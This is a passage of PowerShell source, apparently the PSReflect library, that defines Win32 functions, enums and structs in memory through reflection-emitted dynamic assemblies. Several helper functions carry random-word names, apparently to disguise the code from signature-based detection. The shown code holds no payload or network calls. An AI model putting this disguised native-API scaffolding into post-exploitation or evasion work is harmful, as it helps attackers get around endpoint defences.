    )
    $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
    $LoadedAssemblies = $AppDomain.GetAssemblies()
    foreach ($Assembly in $LoadedAssemblies) {
        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
            return $Assembly
        }
    }
    $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
    $Domain = $AppDomain
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)
    return $ModuleBuilder
}
function func {
    Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $DllName,
        [Parameter(Position = 1, Mandatory = $True)]
        [string]
        $FunctionName,
        [Parameter(Position = 2, Mandatory = $True)]
        [Type]
        $ReturnType,
        [Parameter(Position = 3)]
        [Type[]]
        $ParameterTypes,
        [Parameter(Position = 4)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention,
        [Parameter(Position = 5)]
        [Runtime.InteropServices.CharSet]
        $Charset,
        [String]
        $EntryPoint,
        [Switch]
        $SetLastError
    )
    $Properties = @{
        DllName = $DllName
        FunctionName = $FunctionName
        ReturnType = $ReturnType
    }
    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
    if ($Charset) { $Properties['Charset'] = $Charset }
    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }
    New-Object PSObject -Property $Properties
}
function geegaw
{
    [OutputType([Hashtable])]
    Param(
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $DllName,
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [String]
        $FunctionName,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [String]
        $EntryPoint,
        [Parameter(Mandatory=$True, ValueFromPipelineByPropertyName=$True)]
        [Type]
        $ReturnType,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Type[]]
        $ParameterTypes,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CallingConvention]
        $NativeCallingConvention = [Runtime.InteropServices.CallingConvention]::StdCall,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Runtime.InteropServices.CharSet]
        $Charset = [Runtime.InteropServices.CharSet]::Auto,
        [Parameter(ValueFromPipelineByPropertyName=$True)]
        [Switch]
        $SetLastError,
        [Parameter(Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [ValidateNotNull()]
        [String]
        $Namespace = ''
    )
    BEGIN
    {
        $TypeHash = @{}
    }
    PROCESS
    {
        if ($Module -is [Reflection.Assembly])
        {
            if ($Namespace)
            {
                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
            }
            else
            {
                $TypeHash[$DllName] = $Module.GetType($DllName)
            }
        }
        else
        {
            if (!$TypeHash.ContainsKey($DllName))
            {
                if ($Namespace)
                {
                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                }
                else
                {
                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                }
            }
            $Method = $TypeHash[$DllName].DefineMethod(
                $FunctionName,
                'Public,Static,PinvokeImpl',
                $ReturnType,
                $ParameterTypes)
            $i = 1
            foreach($Parameter in $ParameterTypes)
            {
                if ($Parameter.IsByRef)
                {
                    [void] $Method.DefineParameter($i, 'Out', $null)
                }
                $i++
            }
            $DllImport = [Runtime.InteropServices.DllImportAttribute]
            $SetLastErrorField = $DllImport.GetField('SetLastError')
            $CallingConventionField = $DllImport.GetField('CallingConvention')
            $CharsetField = $DllImport.GetField('CharSet')
            $EntryPointField = $DllImport.GetField('EntryPoint')
            if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }
            if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }
            $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
            $DllImportAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($Constructor,
                $DllName, [Reflection.PropertyInfo[]] @(), [Object[]] @(),
                [Reflection.FieldInfo[]] @($SetLastErrorField,
                                           $CallingConventionField,
                                           $CharsetField,
                                           $EntryPointField),
                [Object[]] @($SLEValue,
                             ([Runtime.InteropServices.CallingConvention] $NativeCallingConvention),
                             ([Runtime.InteropServices.CharSet] $Charset),
                             $ExportedFuncName))
            $Method.SetCustomAttribute($DllImportAttribute)
        }
    }
    END
    {
        if ($Module -is [Reflection.Assembly])
        {
            return $TypeHash
        }
        $ReturnTypes = @{}
        foreach ($Key in $TypeHash.Keys)
        {
            $Type = $TypeHash[$Key].CreateType()
            $ReturnTypes[$Key] = $Type
        }
        return $ReturnTypes
    }
}
function Valenti {
    [OutputType([Type])]
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,
        [Parameter(Position = 2, Mandatory=$True)]
        [Type]
        $Type,
        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $EnumElements,
        [Switch]
        $Bitfield
    )
    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }
    $EnumType = $Type -as [Type]
    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)
    if ($Bitfield)
    {
        $FlagsConstructor = [FlagsAttribute].GetConstructor(@())
        $FlagsCustomAttribute = New-Object Reflection.Emit.CustomAttributeBuilder($FlagsConstructor, @())
        $EnumBuilder.SetCustomAttribute($FlagsCustomAttribute)
    }
    foreach ($Key in $EnumElements.Keys)
    {
        $null = $EnumBuilder.DefineLiteral($Key, $EnumElements[$Key] -as $EnumType)
    }
    $EnumBuilder.CreateType()
}
function field {
    Param (
        [Parameter(Position = 0, Mandatory=$True)]
        [UInt16]
        $Position,
        [Parameter(Position = 1, Mandatory=$True)]
        [Type]
        $Type,
        [Parameter(Position = 2)]
        [UInt16]
        $Offset,
        [Object[]]
        $MarshalAs
    )
    @{
        Position = $Position
        Type = $Type -as [Type]
        Offset = $Offset
        MarshalAs = $MarshalAs
    }
}
function meshed
{
    [OutputType([Type])]
    Param (
        [Parameter(Position = 1, Mandatory=$True)]
        [ValidateScript({($_ -is [Reflection.Emit.ModuleBuilder]) -or ($_ -is [Reflection.Assembly])})]
        $Module,
        [Parameter(Position = 2, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [String]
        $FullName,
        [Parameter(Position = 3, Mandatory=$True)]
        [ValidateNotNullOrEmpty()]
        [Hashtable]
        $StructFields,
        [Reflection.Emit.PackingSize]
        $PackingSize = [Reflection.Emit.PackingSize]::Unspecified,
        [Switch]
        $ExplicitLayout
    )
    if ($Module -is [Reflection.Assembly])
    {
        return ($Module.GetType($FullName))
    }
    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
        Class,
        Public,
        Sealed,
        BeforeFieldInit'
    if ($ExplicitLayout)
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::ExplicitLayout
    }
    else
    {
        $StructAttributes = $StructAttributes -bor [Reflection.TypeAttributes]::SequentialLayout
    }
    $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
    $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
    $Fields = New-Object Hashtable[]($StructFields.Count)
    foreach ($Field in $StructFields.Keys)
    {
        $Index = $StructFields[$Field]['Position']
        $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
    }
    foreach ($Field in $Fields)
    {
        $FieldName = $Field['FieldName']
        $FieldProp = $Field['Properties']
        $Offset = $FieldProp['Offset']
        $Type = $FieldProp['Type']
        $MarshalAs = $FieldProp['MarshalAs']
        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')
        if ($MarshalAs)
        {
            $UnmanagedType = $MarshalAs[0] -as ([Runtime.InteropServices.UnmanagedType])
            if ($MarshalAs[1])
            {
                $Size = $MarshalAs[1]
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo,
                    $UnmanagedType, $SizeConst, @($Size))
            }
            else
            {
                $AttribBuilder = New-Object Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, [Object[]] @($UnmanagedType))
            }
            $NewField.SetCustomAttribute($AttribBuilder)
        }
        if ($ExplicitLayout) { $NewField.SetOffset($Offset) }
    }
    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
        'Public, Static',
        [Int],
        [Type[]] @())
    $ILGenerator = $SizeMethod.GetILGenerator()
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
    $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)
    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
        'PrivateScope, Public, Static, HideBySig, SpecialName',
        $StructBuilder,
        [Type[]] @([IntPtr]))
    $ILGenerator2 = $ImplicitConverter.GetILGenerator()
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Nop)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Type].GetMethod('GetTypeFromHandle'))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
    $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)
    $StructBuilder.CreateType()
}
